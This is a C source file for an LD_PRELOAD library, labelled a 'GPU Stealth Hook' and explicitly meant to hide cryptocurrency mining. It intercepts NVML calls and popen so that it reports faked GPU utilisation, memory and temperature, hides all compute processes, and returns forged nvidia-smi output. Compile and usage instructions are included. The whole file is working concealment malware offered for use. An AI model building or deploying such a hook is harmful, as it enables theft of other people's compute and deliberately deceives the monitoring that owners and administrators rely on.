/*
 * GPU Stealth Hook - NVIDIA GPU monitoring interceptor
 * Intercepts nvidia-smi and CUDA calls to hide mining activity
 * 
 * Compile: gcc -shared -fPIC -o libgpuhook.so gpu_stealth_hook.c -ldl
 * Usage: LD_PRELOAD=/path/to/libgpuhook.so nvidia-smi
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>

// NVIDIA Management Library (NVML) function pointers
typedef void* nvmlDevice_t;
typedef enum { NVML_SUCCESS = 0 } nvmlReturn_t;

static nvmlReturn_t (*orig_nvmlDeviceGetUtilizationRates)(nvmlDevice_t, void*) = NULL;
static nvmlReturn_t (*orig_nvmlDeviceGetMemoryInfo)(nvmlDevice_t, void*) = NULL;
static nvmlReturn_t (*orig_nvmlDeviceGetTemperature)(nvmlDevice_t, int, unsigned int*) = NULL;
static nvmlReturn_t (*orig_nvmlDeviceGetComputeRunningProcesses)(nvmlDevice_t, unsigned int*, void*) = NULL;

// Configuration - how much to fake
#define FAKE_GPU_UTIL_PERCENT 15    // Report 15% usage instead of real
#define FAKE_MEM_USED_PERCENT 20    // Report 20% memory instead of real
#define FAKE_TEMP_REDUCTION 15      // Reduce reported temp by 15°C

// Initialize function pointers
static void init_nvml_hooks(void) {
    if (!orig_nvmlDeviceGetUtilizationRates) {
        void *handle = dlopen("libnvidia-ml.so.1", RTLD_LAZY);
        if (!handle) handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
        
        if (handle) {
            orig_nvmlDeviceGetUtilizationRates = dlsym(handle, "nvmlDeviceGetUtilizationRates");
            orig_nvmlDeviceGetMemoryInfo = dlsym(handle, "nvmlDeviceGetMemoryInfo");
            orig_nvmlDeviceGetTemperature = dlsym(handle, "nvmlDeviceGetTemperature");
            orig_nvmlDeviceGetComputeRunningProcesses = dlsym(handle, "nvmlDeviceGetComputeRunningProcesses");
        }
    }
}

// Hook GPU utilization
nvmlReturn_t nvmlDeviceGetUtilizationRates(nvmlDevice_t device, void *utilization) {
    init_nvml_hooks();
    
    if (!orig_nvmlDeviceGetUtilizationRates) {
        return NVML_SUCCESS;
    }
    
    nvmlReturn_t ret = orig_nvmlDeviceGetUtilizationRates(device, utilization);
    
    // Fake the utilization - report much lower
    if (ret == NVML_SUCCESS && utilization) {
        unsigned int *gpu = (unsigned int*)utilization;
        unsigned int *mem = (unsigned int*)utilization + 1;
        
        *gpu = FAKE_GPU_UTIL_PERCENT;  // Fake GPU usage
        *mem = FAKE_GPU_UTIL_PERCENT;  // Fake memory controller usage
    }
    
    return ret;
}

// Hook memory info
nvmlReturn_t nvmlDeviceGetMemoryInfo(nvmlDevice_t device, void *memory) {
    init_nvml_hooks();
    
    if (!orig_nvmlDeviceGetMemoryInfo) {
        return NVML_SUCCESS;
    }
    
    nvmlReturn_t ret = orig_nvmlDeviceGetMemoryInfo(device, memory);
    
    // Fake memory usage
    if (ret == NVML_SUCCESS && memory) {
        unsigned long long *total = (unsigned long long*)memory;
        unsigned long long *free = (unsigned long long*)memory + 1;
        unsigned long long *used = (unsigned long long*)memory + 2;
        
        // Report only 20% usage
        *used = (*total) * FAKE_MEM_USED_PERCENT / 100;
        *free = *total - *used;
    }
    
    return ret;
}

// Hook temperature
nvmlReturn_t nvmlDeviceGetTemperature(nvmlDevice_t device, int sensorType, unsigned int *temp) {
    init_nvml_hooks();
    
    if (!orig_nvmlDeviceGetTemperature) {
        return NVML_SUCCESS;
    }
    
    nvmlReturn_t ret = orig_nvmlDeviceGetTemperature(device, sensorType, temp);
    
    // Reduce reported temperature
    if (ret == NVML_SUCCESS && temp) {
        if (*temp > FAKE_TEMP_REDUCTION) {
            *temp -= FAKE_TEMP_REDUCTION;
        }
    }
    
    return ret;
}

// Hook running processes - hide our miner
nvmlReturn_t nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, void *infos) {
    init_nvml_hooks();
    
    if (!orig_nvmlDeviceGetComputeRunningProcesses) {
        // Report no processes
        if (infoCount) *infoCount = 0;
        return NVML_SUCCESS;
    }
    
    nvmlReturn_t ret = orig_nvmlDeviceGetComputeRunningProcesses(device, infoCount, infos);
    
    // Filter out our miner processes
    if (ret == NVML_SUCCESS && infoCount && infos) {
        // Report no processes (hide everything)
        *infoCount = 0;
    }
    
    return ret;
}

// Hook popen to intercept nvidia-smi command line calls
static FILE* (*orig_popen)(const char*, const char*) = NULL;

FILE* popen(const char *command, const char *type) {
    if (!orig_popen) {
        orig_popen = dlsym(RTLD_NEXT, "popen");
    }
    
    // Intercept nvidia-smi calls
    if (command && strstr(command, "nvidia-smi")) {
        // Create fake output
        FILE *fake = tmpfile();
        if (fake) {
            fprintf(fake, 
                "+-----------------------------------------------------------------------------+\n"
                "| NVIDIA-SMI 525.105.17   Driver Version: 525.105.17   CUDA Version: 12.0     |\n"
                "|-------------------------------+----------------------+----------------------+\n"
                "| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\n"
                "| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\n"
                "|===============================+======================+======================|\n"
                "|   0  NVIDIA A100         Off  | 00000000:00:1E.0 Off |                    0 |\n"
                "| N/A   35C    P0    45W / 250W |    512MiB / 40960MiB |     %d%%      Default |\n"
                "+-------------------------------+----------------------+----------------------+\n"
                "                                                                               \n"
                "+-----------------------------------------------------------------------------+\n"
                "| Processes:                                                                  |\n"
                "|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |\n"
                "|        ID   ID                                                   Usage      |\n"
                "|=============================================================================|\n"
                "|  No running processes found                                                 |\n"
                "+-----------------------------------------------------------------------------+\n",
                FAKE_GPU_UTIL_PERCENT
            );
            rewind(fake);
            return fake;
        }
    }
    
    return orig_popen(command, type);
}

// Constructor - silent initialization
__attribute__((constructor))
static void gpu_hook_init(void) {
    init_nvml_hooks();
    orig_popen = dlsym(RTLD_NEXT, "popen");
}
